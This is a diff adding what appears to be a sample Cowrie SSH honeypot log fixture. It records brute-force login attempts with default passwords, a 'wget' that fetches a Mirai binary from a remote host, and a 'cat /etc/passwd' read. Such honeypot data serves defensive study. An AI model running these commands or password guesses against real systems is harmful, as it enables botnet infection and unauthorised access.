@@ -1,0 +1,16 @@
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","src_port":51000,"dst_ip":"10.88.0.8","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-11-15T01:00:00.000000Z","message":"New connection: 198.51.100.23:51000"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","eventid":"cowrie.client.version","version":"SSH-2.0-libssh_0.9.6","timestamp":"2026-11-15T01:00:01.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","username":"root","password":"123456","eventid":"cowrie.login.failed","timestamp":"2026-11-15T01:00:02.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","username":"root","password":"toor","eventid":"cowrie.login.failed","timestamp":"2026-11-15T01:00:03.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","username":"root","password":"admin","eventid":"cowrie.login.failed","timestamp":"2026-11-15T01:00:04.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","username":"root","password":"P@ssw0rd","eventid":"cowrie.login.success","timestamp":"2026-11-15T01:00:05.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","input":"uname -a","eventid":"cowrie.command.input","timestamp":"2026-11-15T01:00:06.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","input":"wget http://185.220.101.4/bins/mirai.x86","eventid":"cowrie.command.input","timestamp":"2026-11-15T01:00:07.000000Z"}
+{"session":"aaa1","protocol":"ssh","src_ip":"198.51.100.23","url":"http://185.220.101.4/bins/mirai.x86","shasum":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","eventid":"cowrie.session.file_download","timestamp":"2026-11-15T01:00:08.000000Z"}
+{"session":"bbb2","protocol":"ssh","src_ip":"203.0.113.7","src_port":52000,"dst_ip":"10.88.0.8","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-11-15T02:00:00.000000Z"}
+{"session":"bbb2","protocol":"ssh","src_ip":"203.0.113.7","username":"admin","password":"admin","eventid":"cowrie.login.failed","timestamp":"2026-11-15T02:00:01.000000Z"}
+{"session":"bbb2","protocol":"ssh","src_ip":"203.0.113.7","username":"root","password":"123456","eventid":"cowrie.login.failed","timestamp":"2026-11-15T02:00:02.000000Z"}
+{"session":"ccc3","protocol":"ssh","src_ip":"192.0.2.55","src_port":53000,"dst_ip":"10.88.0.8","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-11-15T03:00:00.000000Z"}
+{"session":"ccc3","protocol":"ssh","src_ip":"192.0.2.55","username":"deploy","password":"deploy123","eventid":"cowrie.login.success","timestamp":"2026-11-15T03:00:01.000000Z"}
+{"session":"ccc3","protocol":"ssh","src_ip":"192.0.2.55","input":"cat /etc/passwd","eventid":"cowrie.command.input","timestamp":"2026-11-15T03:00:02.000000Z"}
+{"session":"ddd4","protocol":"ssh","src_ip":"198.51.100.23","src_port":54000,"dst_ip":"10.88.0.8","dst_port":2222,"eventid":"cowrie.session.connect","timestamp":"2026-11-15T04:00:00.000000Z"}
